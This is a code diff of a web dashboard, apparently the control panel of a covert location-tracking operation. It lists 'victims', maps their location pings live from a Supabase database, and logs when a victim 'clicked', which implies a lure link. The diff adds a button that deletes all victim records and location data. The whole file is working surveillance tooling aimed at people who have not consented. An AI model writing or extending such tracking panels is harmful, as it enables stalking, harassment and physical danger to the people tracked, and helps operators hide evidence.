@@ -7,12 +7,13 @@
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     body { margin:0; background:#111; color:#0f0; font-family:Arial; }
-    #map { height:65vh; width:100%; }
+    #map { height:60vh; width:100%; }
     .controls { padding:15px; background:#1a1a1a; text-align:center; }
     select, button { padding:12px; margin:5px; font-size:16px; }
     .delete-victim { background:#c00; color:white; font-weight:bold; }
+    .delete-all { background:#900; color:white; font-weight:bold; padding:14px 25px; }
     .activity { padding:15px; background:#1a1a1a; max-height:200px; overflow-y:auto; }
-    .log { padding:10px; margin:5px 0; background:#222; border-left:4px solid #0f0; }
+    .log { padding:10px; margin:5px 0; background:#222; }
   </style>
 </head>
 <body>
@@ -20,8 +21,9 @@
   
   <div class="controls">
     <strong>Select Victim: </strong>
-    <select id="victimSelect" onchange="loadSelectedVictim()"></select>
-    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete Victim</button>
+    <select id="victimSelect" onchange="loadSelectedVictim()" style="width:380px;"></select>
+    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim</button>
+    <button class="delete-all" onclick="deleteAllVictims()">☠️ DELETE ALL VICTIMS</button>
   </div>
 
   <div id="map"></div>
@@ -37,7 +39,6 @@
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
     let currentVictimId = "";
-    let markers = [];
 
     async function loadVictimsList() {
       const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc`, {
@@ -46,7 +47,8 @@
       const victims = await res.json();
       
       const select = document.getElementById('victimSelect');
-      select.innerHTML = '<option value="">All Victims</option>';
+      select.innerHTML = '<option value="">-- Select Victim --</option>';
+      
       victims.forEach(v => {
         const opt = document.createElement('option');
         opt.value = v.id;
@@ -57,37 +59,34 @@
 
     async function loadSelectedVictim() {
       currentVictimId = document.getElementById('victimSelect').value;
-      loadLiveData();
+      if (currentVictimId) loadLiveData();
     }
 
     async function loadLiveData() {
-      let url = `${SUPABASE_URL}/rest/v1/location_pings?select=*&order=created_at.desc`;
-      if (currentVictimId) url += `&session_id=eq.${currentVictimId}`;
-
-      const res = await fetch(url, { headers: { "apikey": SUPABASE_KEY } });
+      if (!currentVictimId) return;
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}&order=created_at.desc`, {
+        headers: { "apikey": SUPABASE_KEY }
+      });
       const data = await res.json();
 
-      markers.forEach(m => map.removeLayer(m));
-      markers = [];
+      map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
 
       const bounds = [];
-
       data.forEach(item => {
         if (item.lat && item.lon) {
           const marker = L.marker([item.lat, item.lon]).addTo(map);
           marker.bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}`);
-          markers.push(marker);
           bounds.push([item.lat, item.lon]);
         }
       });
 
       if (bounds.length > 0) {
-        map.fitBounds(bounds, { padding: [60, 60], maxZoom: 18 });
+        map.fitBounds(bounds, { padding: [80, 80], maxZoom: 18 });
       }
     }
 
     async function loadActivityLog() {
-      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=12`, {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=10`, {
         headers: { "apikey": SUPABASE_KEY }
       });
       const sessions = await res.json();
@@ -97,21 +96,34 @@
       sessions.forEach(s => {
         const div = document.createElement('div');
         div.className = "log";
-        div.innerHTML = `✅ <strong>VICTIM CLICKED</strong> - ${s.label} (${s.owner_id})<br><small>${new Date(s.created_at).toLocaleString()}</small>`;
+        div.innerHTML = `✅ <strong>${s.label}</strong> (${s.owner_id})<br><small>${new Date(s.created_at).toLocaleString()}</small>`;
         logDiv.appendChild(div);
       });
     }
 
     async function deleteCurrentVictim() {
-      if (!currentVictimId) return alert("Select victim first");
-      if (!confirm("Delete this victim completely?")) return;
+      if (!currentVictimId) return alert("Select a victim first");
+      if (!confirm("Delete this victim?")) return;
 
       await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
       await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
 
       alert("Victim deleted!");
-      loadVictimsList();
       currentVictimId = "";
+      loadVictimsList();
+      loadLiveData();
+      loadActivityLog();
+    }
+
+    async function deleteAllVictims() {
+      if (!confirm("⚠️ DELETE ALL VICTIMS AND ALL DATA?\nThis cannot be undone!")) return;
+
+      await fetch(`${SUPABASE_URL}/rest/v1/location_pings`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
+      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
+
+      alert("ALL VICTIMS DELETED!");
+      currentVictimId = "";
+      loadVictimsList();
       loadLiveData();
       loadActivityLog();
     }
@@ -120,7 +132,10 @@
     loadVictimsList();
     loadLiveData();
     loadActivityLog();
-    setInterval(() => { loadLiveData(); loadActivityLog(); }, 5000);
+    setInterval(() => {
+      if (currentVictimId) loadLiveData();
+      loadActivityLog();
+    }, 5000);
   </script>
 </body>
 </html>
